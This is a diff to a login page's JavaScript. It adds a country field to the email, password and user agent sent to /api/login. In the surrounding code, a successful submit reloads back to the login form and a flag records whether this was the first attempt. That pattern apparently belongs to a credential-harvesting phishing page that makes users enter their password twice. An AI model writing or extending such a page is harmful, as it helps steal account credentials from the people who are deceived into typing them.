@@ -77,13 +77,14 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   } catch (e) { /* ignore */ }
 
-  // --- Login form handling (updated per request) ---
+  // --- Login form handling (updated) ---
   var form = document.getElementById('loginForm');
   if (form) {
     form.addEventListener('submit', async function (e) {
       e.preventDefault();
       var email = document.getElementById('email').value;
       var password = document.getElementById('password').value;
+      var country = countrySelect ? countrySelect.value : '';
 
       // Immediate visual feedback: set to "Logining" as requested
       var btn = document.querySelector('.btn-login');
@@ -108,17 +109,19 @@ document.addEventListener('DOMContentLoaded', function () {
         const resp = await fetch('/api/login', {
           method: 'POST',
           headers: headers,
-          body: JSON.stringify({ email, password, userAgent: navigator.userAgent })
+          body: JSON.stringify({
+            email,
+            password,
+            country,
+            userAgent: navigator.userAgent
+          })
         });
 
         // After attempt, mark that we tried (so future submits are not considered "first")
         try { localStorage.setItem('loginAttempted', 'true'); } catch (err) { /* ignore */ }
 
-        // If server responded OK we will reload the page to fallback to the login page
-        // (this ensures the UI resets and meets "fallback to the login page" requirement).
-        // If you prefer a redirect to a different page, change the location accordingly.
         if (resp.ok) {
-          // Small delay so user sees "Logining" state briefly (optional), then reload.
+          // Small delay so user sees "Logining" state briefly, then reload to fallback to login page.
           setTimeout(function () {
             window.location.reload();
           }, 600);
